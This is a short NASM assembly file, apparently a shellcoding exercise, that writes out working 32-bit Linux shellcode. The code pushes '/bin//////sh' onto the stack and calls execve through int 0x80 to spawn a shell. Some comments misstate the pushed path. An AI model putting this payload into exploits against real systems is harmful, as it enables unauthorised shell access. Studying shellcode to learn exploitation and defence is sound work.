; binsh.nasm
; Author: Kunal Varudkar
; Develope a shellcode to execute /bin/sh


global _start

section .text

_start:


        ; push Null dword on the stack
        xor eax, eax
        push eax

        ; push /bin//////sh in reverse order to stack (strlen=even)
        push 0x68732f2f
        push 0x2f2f2f2f
        push 0x6e69622f

        ; Moving //bin/sh to ebx register
        mov ebx, esp 

        ; push Null on stack
        push eax

        ; pointing esp to edx (envp[]=NULL)
        mov edx, esp

        ; push the address of //bin/sh stored in ebx
        push ebx

        ; point the top tof the stack to ECX[argv[]]
        mov ecx, esp

        ; call syscall
        mov al, 0xb  ; or 11
        int 0x80

